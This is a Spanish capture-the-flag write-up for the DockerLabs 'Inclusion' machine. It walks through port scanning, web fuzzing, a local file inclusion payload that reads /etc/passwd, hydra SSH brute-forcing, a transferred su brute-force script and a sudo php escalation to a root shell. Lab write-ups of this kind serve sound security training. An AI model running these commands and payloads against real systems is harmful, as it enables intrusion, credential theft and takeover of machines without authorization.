# [Inclusion](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash inclusion.sh pn.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).


## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)

`-c 1` ⮞ solo lo repite una vez

<br>

Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que están abiertos los puertos **22** y **80**.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/c91da2c7-4b9e-417b-a801-b28d320ccd7e)

<br>
<br>

## Página Web (Puerto 80)

Al ver que aloja un servidor web, nos dirigimos a él poniendo en el buscador la ip que en este caso sería `172.17.0.2:8080`. Observamos la página por defecto de `Apache2`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/09542a08-3c72-4f65-ac81-f82b40b244eb)

<br>

Como no encontramos nada en el Código Fuente (CTRL + U), nos dirigimos a hacer fuzzing de la siguiente forma `gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2 -x php,html,txt,sh,py,js`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/be1e6c39-b74e-4607-8528-427dba82d8fd)

<br>

Nos encuentra un directorio llamado `/shop`, nos dirigimos a él y observamos lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/722fd8c2-ca75-4319-b129-7166d082721c)

<br>

Observamos abajo a la izquierda una pequeña pista, probamos ha hacer fuzzing otra vez pero ahora sobre `http://172.17.0.2/shop/` de la siguiente forma `gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2/shop -x php,html,txt,sh,py,js`, y nos encuentra el archivo `index.php`.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/7cb89bed-c9bc-412e-868f-66b953aff6e7)

<br>

Teniendo en cuenta esta pista (`"Error de Sistema: ($_GET['archivo']");`), se ha a entender que la palabra `archivo` se pasa por parámetro a `index.php`. Haremos un fuzzing por parámetro para este archivo `index.php` en busca de un posible LFI, usaremos `wfuzz` de la siguiente forma `wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2/shop/index.php?FUZZ=../../../../../etc/passwd --hc 404 --hl 44`,  y nos reportará lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/39283a12-6806-4f52-a59d-bc84528a63b0)

<br>

Por lo que la pista que nos había dado era correcta, nos dirigimos a la web y aplicamos el LFI de la siguiente forma `http://172.17.0.2/shop/index.php?archivo=../../../../../../../etc/passwd`, y el output será el siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/f94a83d3-b335-4ddb-8dd9-0370aed07e39)

<br>

### Hydra

Una vez que conocemos los posible usuarios **manchi** y **seller**, haremos fuerza bruta sobre el puerto 22 donde corre el servicio de `ssh`. Primero sobre el usuario **seller** `hydra -l seller -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I -t 4` pero no encontraremos nada, en cambio para el usuario **manchi** `hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I`, nos reporta lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/a331910d-c5e9-473d-8f8b-ed3614b47d61)

 > Podríamos usar un archivo el cual contenga los nombre de usuarios, pero en esta caso tardaría más en encontrarnos la contraseña siempre y cuando pongamos primero al usuario seller.

<br>
<br>

## SSH (Puerto 22)

Una vez que conocemos el usuario **manchi** y la contraseña **lovely** probamos a autenticarnos mediante `ssh` de la siguiente forma `ssh manchi@172.17.0.2`, introducimos la contraseña y listo ya estamos dentro de la máquina Inclusion:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/a0426ac8-5f6f-44ea-9d1a-f689a1fff96b)

 > El (;) concatena dos comandos.

<br>
<br>

## Escalada de Privilegios

No es necesario el tratamiento de la TTY ya que directamente nos aparece una terminal cómoda.

<br>

Ejecutamos el comando `sudo -l` para ver que podemos ejecutar como sudo, pero no encontramos nada: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/62c73333-7078-4a87-a143-8cd35e72ea84)

<br>

Al igual que si ejecutamos `find / -perm -4000 2>/dev/null` en búsqueda de permisos SUID no encontramos nada potencial para escalar privilegios. 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/0cd84fce-57c4-4ed8-a9f3-b48e341ed729)

`/` ⮞ buscamos desde la raíz <br>
`-perm -4000` ⮞ mostrar los permisos SUID <br>
`2>/dev/null` ⮞ para que no nos muestre los errores 

<br>

También buscamos en los directorios más comunes como `/tmp`, `/opt` y por procesos también y no encontramos nada. Por lo único que nos queda es hacer fuerza bruta al otro usuario **seller**, para ello nos descargamos esta herramienta para hacer fuerza bruta [Linux-Su-Force](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh). La compartimos con la máquina víctima, existen varias formas `scp` o `base64` ya que no tenemos ni `curl` ni `wget`. Para compartirme el script usare `base64`.

<br>

Convierto el archivo `Linux-Su-Force.sh` ha base64 con `cat Linux-Su-Force.sh | base64 -w0`
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/548b541b-61c9-4bd7-b284-747a27dca0ce)

<br>

Y después en la máquina víctima copio el contenido en base64 en un archivo `.txt`, y después lo vuelvo a convertir al formato original con esto:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/3df749bf-283e-492d-8a45-d87d3b3619d3)

<br>

Aunque nos da error, si hacemos un `cat Linux-Su-Force.sh` vemos que tiene el contenido original (decodificado). Ahora le otorgamos permisos de ejecución con `chmod +x Linux-Su-Force.sh`, y lo ejecutamos `./Linux-Su-Force.sh`.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/ef308065-75e9-4b4e-92a9-dcf739664148)

<br>

Vemos que nos pide un diccionario, por lo que vamos a transferirlo a nuestra máquina víctima usando la otra forma `scp`, para ello en nuestra máquina atacante haremos `scp rockyou.txt manchi@172.17.0.2:/home/manchi`, nos pedirá la contraseña de manchi, y si nos dirigimos a la máquina Inclusion:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/5a2a1f30-571d-443d-9e1b-db4cd40cdb47)

<br>

Por lo que ahora podemos ejecutar el script de la siguiente forma `./Linux-Su-Force.sh seller rockyou.txt`, y nos encuentra la siguiente contraseña:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/620263c1-610d-4cfc-8fc8-6bee3845e836)

<br>

Por lo que hacemos `su seller`, introducimos la contraseña **qwerty** y listo ya somos el usuario **seller**:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/ef861220-1971-42ca-bee0-4c1b4b729b0e)

<br>

Seguimos el mismo procedimiento de antes y ejecutamos el comando `sudo -l` para ver que podemos ejecutar como sudo:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/3fc13b67-13c4-4257-a3e8-699eb86e14a7)

<br>

Entonces mirando en [GTFOBins](https://gtfobins.github.io/) podemos ver lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/3efab5f4-5fb3-434c-b98d-7b8ff2fb5feb)

<br>

Entonces en la máquina ejecutaremos `sudo -u root /usr/bin/php -r "system('/bin/bash');"`, y listo ya somos **root!**
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/f13cb2ce-a250-4c6e-b2cc-7ad5ecb1006a)